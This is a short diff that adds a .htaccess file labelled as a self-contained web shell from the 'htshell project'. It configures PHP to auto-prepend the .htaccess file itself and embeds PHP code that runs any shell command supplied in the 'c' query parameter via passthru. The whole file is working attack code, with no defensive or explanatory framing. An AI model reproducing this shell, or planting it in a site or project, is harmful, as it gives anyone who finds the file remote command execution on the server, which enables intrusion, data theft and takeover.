@@ -1,0 +1,9 @@
+# ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id
+# Self contained .htaccess web shell - Part of the htshell project.
+# Execute .htaccess php code, by auto prepending the .htaccess file.
+
+php_value auto_prepend_file .htaccess
+php_value output_buffering 1
+
+###### SHELL ######
+<?php ob_clean(); if ($_GET['c'] != '') { passthru($_GET['c']." 2>&1"); ob_flush(); exit; } else { ob_flush(); } ?>
